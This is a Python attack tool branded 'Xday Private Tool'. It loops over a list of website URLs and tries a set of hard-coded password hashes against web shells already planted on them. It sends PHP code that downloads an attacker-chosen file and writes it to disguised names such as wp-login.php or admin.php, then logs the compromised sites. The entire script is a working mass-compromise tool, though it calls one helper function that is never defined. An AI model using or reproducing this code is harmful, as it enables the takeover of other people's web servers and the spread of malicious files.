import sys
import requests
import base64
import string
import random
from multiprocessing.dummy import Pool
from colorama import Fore, init

init(autoreset=True)
fr = Fore.RED
fg = Fore.GREEN

banner = '''{}         
[#] Create By ::

                             Xday Private Tool
                          https://t.me/Xday_Priv8
\n'''.format(fr)
print(banner)

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    fileToUploadContent = sys.argv[2]
    url_list_file = sys.argv[1]
except IndexError:
    print("\nUsage: python file.py list.txt")
    sys.exit(1)

resultFile = 'Results.txt'

fileNames = ['radio.php', 'content.php', 'lock360.php', 'admin.php', 'wp-login.php']

passwords = '''
e115ea764553c3989bdb01afb29e6136
caedcc170541362068afbe4d87c6ff09
e59f4d639448c0f5e352b97bc62e693c
...
'''

try:
    with open(url_list_file, 'r') as f:
        urls = [line.strip() for line in f if line.strip()]
except Exception as e:
    print(f"Error opening file {url_list_file}: {e}")
    sys.exit(1)

passwords = [i.strip() for i in passwords.splitlines()]

Headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36',
}


def SendRequest(url, password, fileName):
    Params = {
        'pwd163': password,
        'zzz': f'file_put_contents("{fileName}", file_get_contents("{fileToUploadContent}")); echo "GOOD";'
    }
    try:
        res = requests.post(url, params=Params, headers=Headers, verify=False, timeout=60)
        check = res.text
        res.close()
        if 'GOOD' in check:
            return True
    except requests.exceptions.RequestException as err:
        print(f"Error with request: {err}")
    return False


class Worker:
    def work(self, url):
        good = False
        for password in passwords:
            if good:
                continue
            fileName = random.choice(fileNames)
            if SendRequest(url, password, fileName):
                print('[GOOD] ' + ResultUrl(url, fileName))
                with open(resultFile, 'a') as f:
                    f.write(ResultUrl(url, fileName) + '\n')
                good = True
        if not good:
            print('[BAD] ' + url)


worker = Worker()


def runWorker(url):
    try:
        worker.work(url)
    except Exception as e:
        print(f"Error processing URL {url}: {e}")


mp = Pool(10)  # Lower number of threads for safety
mp.map(runWorker, urls)
mp.close()
mp.join()